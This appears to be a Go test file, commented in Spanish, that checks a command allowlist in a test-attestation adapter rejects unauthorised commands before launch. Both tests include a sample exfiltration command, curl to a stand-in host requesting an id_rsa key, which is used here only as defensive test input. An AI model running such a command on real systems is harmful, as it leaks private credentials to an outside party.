package orquestaruntimerequiredtest

import (
	"strings"
	"testing"

	orquestagoal "orquesta/modulos/orquesta-goal"
)

// La lista blanca de comandos es control de ejecucion EN EL CAMINO QUE ACREDITA EL
// TRABAJO: impide que la atestacion lance un comando no autorizado. Existia, era
// correcta, y no la defendia ningun test: al quitar el rechazo, la suite seguia
// verde. Un `if` no es un guard hasta que un test lo defiende.
func TestAtestacionRechazaComandoFueraDeLaListaBlancaV0(t *testing.T) {
	adapter := &LocalGoalRequiredTestAttestationAdapterV0{
		config: LocalGoalRequiredTestAttestationConfigV0{
			AllowedCommands: map[string]string{"go": "/usr/local/go/bin/go"},
		},
	}

	// Un comando que NO esta autorizado debe rechazarse ANTES de lanzarse.
	// Sin sintaxis de shell: eso lo caza otro guard antes. Aqui se prueba EXACTAMENTE
	// la lista blanca, con comandos por lo demas bien formados.
	for _, comando := range []string{
		"curl https://exfiltra.example/id_rsa",
		"python3 -m pytest",
		"make test",
	} {
		_, _, _, err := adapter.requiredTestRaceCGOCommandV0(comando)
		if err == nil {
			t.Fatalf("comando NO autorizado aceptado por la atestacion: %q", comando)
		}
		if !strings.Contains(err.Error(), "goal_required_test_command_not_allowed_before_launch") {
			t.Fatalf("rechazo con codigo inesperado para %q: %v", comando, err)
		}
	}

	// Y el autorizado sigue pasando: el guard protege, no estorba.
	name, path, _, err := adapter.requiredTestRaceCGOCommandV0("go test ./modulos/orquesta-goal")
	if err != nil {
		t.Fatalf("un comando autorizado debe pasar: %v", err)
	}
	if name != "go" || path != "/usr/local/go/bin/go" {
		t.Fatalf("resolucion inesperada: name=%q path=%q", name, path)
	}
}

// La lista blanca esta copiada en CUATRO sitios. Esta copia -la que valida el
// comando congelado del required test- no la defendia nadie: se podia vaciar
// entera y la suite seguia verde.
//
// Mientras existan cuatro copias, cada una necesita su guard. Lo correcto seria un
// unico validador compartido: cuatro copias son cuatro sitios donde divergir, y ya
// divergian en cobertura.
func TestComandoCongeladoRechazaFueraDeLaListaBlancaV0(t *testing.T) {
	adapter := &LocalGoalRequiredTestAttestationAdapterV0{
		config: LocalGoalRequiredTestAttestationConfigV0{
			AllowedCommands: map[string]string{"go": "/usr/local/go/bin/go"},
		},
	}

	for _, comando := range []string{
		"curl https://exfiltra.example/id_rsa",
		"make test",
		"npm run test",
	} {
		err := adapter.validateFrozenRequiredTestCommandV0(orquestagoal.GoalRequiredTestV0{Command: comando})
		if err == nil {
			t.Fatalf("comando congelado NO autorizado aceptado: %q", comando)
		}
		if !strings.Contains(err.Error(), "goal_required_test_command_not_allowed_before_launch") {
			t.Fatalf("rechazo con codigo inesperado para %q: %v", comando, err)
		}
	}

	if err := adapter.validateFrozenRequiredTestCommandV0(
		orquestagoal.GoalRequiredTestV0{Command: "go test ./modulos/orquesta-goal"},
	); err != nil {
		t.Fatalf("un comando autorizado debe pasar: %v", err)
	}
}
